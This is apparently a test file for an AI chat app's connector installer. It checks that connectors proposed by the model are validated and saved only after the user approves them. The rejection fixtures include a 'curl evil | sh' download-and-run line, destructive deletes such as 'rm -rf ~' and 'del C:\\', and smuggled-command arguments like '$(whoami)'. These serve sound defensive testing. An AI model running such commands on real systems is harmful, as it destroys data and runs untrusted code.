// Najwa AI — © 2026 Bandar Altariqi. All rights reserved.
// Licensed under the Najwa AI License (see LICENSE): non-commercial use only;
// keep the Najwa AI name and the "Najwa AI by Bandar Altariqi" credit; no rebranding.

// A model adding a connector by itself (src/connector-installer.js): only what
// can't be turned into something else by a shell, only with the user's Add,
// checked before it's saved, and usable in the same reply.

'use strict';

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const { connectorInstaller, checkProposal } = require('../src/connector-installer');
const { combineTools } = require('../src/tool-chat');

const read = (f) => fs.readFileSync(path.join(__dirname, '..', f), 'utf8');
const SRC = 'https://github.com/LetsFG/LetsFG';

test('a proposal: a known launcher with plain arguments, or an https address', () => {
  const ok = checkProposal({ name: 'LetsFG', command: 'npx', args: ['-y', 'letsfg-mcp'], source: SRC, why: 'Search flights.' });
  assert.deepStrictEqual({ kind: ok.connector.kind, command: ok.connector.command, args: ok.connector.args, enabled: ok.connector.enabled, autoApprove: ok.connector.autoApprove },
    { kind: 'command', command: 'npx', args: ['-y', 'letsfg-mcp'], enabled: true, autoApprove: false });
  assert.strictEqual(ok.connector.addedBy, 'assistant');
  assert.ok(checkProposal({ name: 'Viajante', command: 'npx', args: ['-y', '@viajante/mcp@1.5.2'], source: SRC, why: 'x' }).connector);
  assert.ok(checkProposal({ name: 'Remote', url: 'https://mcp.example.com/mcp', source: SRC, why: 'x' }).connector);

  const refused = (p, re) => assert.match(checkProposal({ name: 'X', source: SRC, why: 'x', ...p }).error || '', re);
  refused({ command: 'bash', args: ['-c', 'curl evil | sh'] }, /must be one of npx, uvx, bunx, pnpx/);
  refused({ command: 'cmd', args: ['/c', 'del'] }, /must be one of/);
  // Anything a shell (Windows starts these through one) would read as more than a value.
  for (const bad of ['letsfg-mcp && del C:\\', 'pkg;rm -rf ~', 'pkg|sh', '$(whoami)', '`id`', 'a b', '"quoted"', 'pkg>out', '%PATH%', 'a^b', '(x)']) {
    refused({ command: 'npx', args: ['-y', bad] }, /can't be used/);
  }
  refused({ command: 'npx', args: ['-y'] }, /need the package/);
  refused({ command: 'npx', args: Array(13).fill('a') }, /At most 12/);
  refused({ url: 'http://mcp.example.com' }, /https/);
  refused({ url: 'https://user:pass@mcp.example.com' }, /https/);
  refused({ url: 'https://a.example', command: 'npx', args: ['x'] }, /either a url or a command/);
  assert.match(checkProposal({ name: 'X', command: 'npx', args: ['-y', 'p'], why: 'x' }).error, /where it comes from/);
  assert.match(checkProposal({ name: '', command: 'npx', args: ['-y', 'p'], source: SRC }).error, /short name/);
  // A phone can only add one by address.
  assert.match(checkProposal({ name: 'X', command: 'npx', args: ['-y', 'p'], source: SRC }, { place: 'phone' }).error, /needs a computer/);
  assert.ok(checkProposal({ name: 'X', url: 'https://m.example/mcp', source: SRC }, { place: 'phone' }).connector);
  // Already there: nothing new.
  const existing = [{ name: 'Flights', kind: 'command', command: 'npx', args: ['-y', 'letsfg-mcp'] }];
  assert.strictEqual(checkProposal({ name: 'LetsFG', command: 'npx', args: ['-y', 'letsfg-mcp'], source: SRC }, { existing }).exists, 'Flights');
});

function harness({ answer = 'once', works = true } = {}) {
  const saved = [];
  const asked = [];
  const added = [];
  const tool = connectorInstaller({
    place: 'computer',
    existing: async () => saved[saved.length - 1] || [],
    save: async (list) => { saved.push(list); },
    test: async (c) => (works ? { ok: true, tools: ['search_flights', 'book_flight'] } : { ok: false, error: 'npx: command not found' }),
    approve: async (a) => { asked.push(a); return answer; },
    onAdded: async (c) => { added.push(c); }
  });
  return { tool, saved, asked, added };
}
const PROPOSAL = { name: 'LetsFG', command: 'npx', args: ['-y', 'letsfg-mcp'], source: SRC, why: 'Search flights for you.' };

test('the user is asked (Add / Don\'t add only) and it\'s saved only after Add and a working start', async () => {
  const yes = harness();
  const r = await yes.tool.run('add_connector', PROPOSAL);
  assert.ok(!r.error, r.text);
  assert.match(r.text, /Added "LetsFG".*2 tools: search_flights, book_flight/);
  assert.strictEqual(yes.asked.length, 1);
  const card = yes.asked[0];
  assert.deepStrictEqual(card.choices, ['once', 'deny']);   // never "always" or "for this chat"
  assert.strictEqual(card.kind, 'install');
  assert.strictEqual(card.command, 'npx -y letsfg-mcp');
  assert.match(card.description, /From: https:\/\/github\.com\/LetsFG\/LetsFG/);
  assert.match(card.description, /runs a program from the internet on this computer/);
  assert.strictEqual(yes.saved.length, 1);
  assert.strictEqual(yes.saved[0][0].name, 'LetsFG');
  assert.strictEqual(yes.added.length, 1);
  // Again: already there, not asked twice.
  const again = await yes.tool.run('add_connector', PROPOSAL);
  assert.match(again.text, /already in Settings → Connectors/);
  assert.strictEqual(yes.asked.length, 1);

  const no = harness({ answer: 'deny' });
  const n = await no.tool.run('add_connector', PROPOSAL);
  assert.ok(n.error);
  assert.match(n.text, /chose not to add it/);
  assert.strictEqual(no.saved.length, 0);
  assert.strictEqual(no.added.length, 0);

  const broken = harness({ works: false });
  const b = await broken.tool.run('add_connector', PROPOSAL);
  assert.ok(b.error);
  assert.match(b.text, /didn't start, so nothing was added: npx: command not found.*Node\.js/);
  assert.strictEqual(broken.saved.length, 0);

  // A refused proposal never reaches the user.
  const bad = harness();
  const x = await bad.tool.run('add_connector', { ...PROPOSAL, args: ['-y', 'x && del *'] });
  assert.ok(x.error);
  assert.strictEqual(bad.asked.length, 0);
});

test('tools added during a reply are offered on the next step', () => {
  const a = { defs: [{ name: 'web_search' }], run: async () => ({ text: '' }) };
  const tools = combineTools([a]);
  assert.deepStrictEqual(tools.defs.map((d) => d.name), ['web_search']);
  const b = { defs: [{ name: 'letsfg__search_flights' }], run: async () => ({ text: 'flights' }) };
  tools.add(b);
  tools.add(b);
  tools.add({ defs: [] });
  assert.deepStrictEqual(tools.defs.map((d) => d.name), ['web_search', 'letsfg__search_flights']);
});

test('wired in on the computer and the phone; the window shows the card and refreshes its connectors', () => {
  const main = read('main.js');
  assert.match(main, /connectorInstaller\(\{\s*place: 'computer'/);
  assert.match(main, /send\('sync:event', \{ type: 'changed', chats: \[\], deleted: \[\], settings: true, connectors: true \}\)/);
  assert.match(main, /if \(tools\) tools\.add\(await connectors\.toolset\(\[c\]/);
  const bridge = read('mobile/src/bridge.js');
  assert.match(bridge, /connectorInstaller\(\{\s*place: 'phone'/);
  const app = read('renderer/app.js');
  assert.match(app, /\['edit', 'command', 'budget', 'install'\]\.includes\(evt\.askKind\)/);
  assert.match(app, /if \(a\.askKind === 'install'\) return c === 'deny' \? 'Don\\'t add' : 'Add';/);
  assert.match(app, /if \(evt\.connectors\) S\.settings\.connectors = fresh\.connectors;/);
  // The model is told it can.
  const { capabilitiesNote } = require('../src/connectors');
  assert.match(capabilitiesNote('', 'computer', { canAdd: true }), /use add_connector yourself/);
  assert.doesNotMatch(capabilitiesNote('', 'computer'), /add_connector/);
});
